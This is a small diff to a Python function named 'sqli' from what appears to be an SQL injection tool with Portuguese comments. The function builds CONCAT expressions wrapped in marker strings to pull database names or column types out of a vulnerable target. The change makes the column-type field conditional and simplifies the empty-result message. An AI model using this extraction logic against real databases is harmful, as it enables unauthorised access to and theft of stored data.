@@ -20,7 +20,8 @@ def sqli(pull_type: str, diretory: str, extra: str="", column=False):
     for i in range(n):
         algr = []
         for j in range(n):
-            algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{i}x'))")
+            if column: algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{i}x'))")
+            else: algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, UPPER('x0tikten{i}x'))")
         algr = ",".join(algr)
         for j in infos:
             if j.split() != [] and column: new.append(f"{pull_type} != '{j.split()[0]}'")
@@ -37,7 +38,7 @@ def sqli(pull_type: str, diretory: str, extra: str="", column=False):
         new = []
     infos = "\n".join(set(infos))
     if infos.replace(" ", "") == "":
-        infos = "\n\033[01;91m[+]\033[0;0m\033[01;39mNot Results.\033[0;0m"
+        infos = "\n<empty>"
     return infos
 
 #função que conta as colunas
